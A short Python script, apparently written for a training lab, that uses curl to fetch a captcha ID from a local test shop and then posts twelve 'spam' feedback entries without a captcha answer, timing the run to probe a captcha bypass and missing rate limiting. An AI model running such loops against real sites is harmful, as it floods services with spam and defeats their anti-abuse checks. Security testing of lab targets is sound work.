import subprocess, time, json

base = "http://lab-mutator:3000"


def post(idx):
    cap = subprocess.run(
        ["curl", "-s", "-X", "GET", base + "/rest/captcha"],
        capture_output=True, text=True,
    ).stdout
    cap = json.loads(cap)
    cid = cap["captchaId"]
    r = subprocess.run(
        [
            "curl",
            "-s",
            "-X",
            "POST",
            base + "/api/Feedbacks",
            "-H",
            "Content-Type:application/json",
            "-d",
            json.dumps({"rating": 5, "comment": "spam" + str(idx), "captchaId": cid}),
        ],
        capture_output=True, text=True,
    )
    return r.stdout[:40]


t = time.time()
for i in range(12):
    print(post(i))
print("12 posts in {:.2f}s".format(time.time() - t))
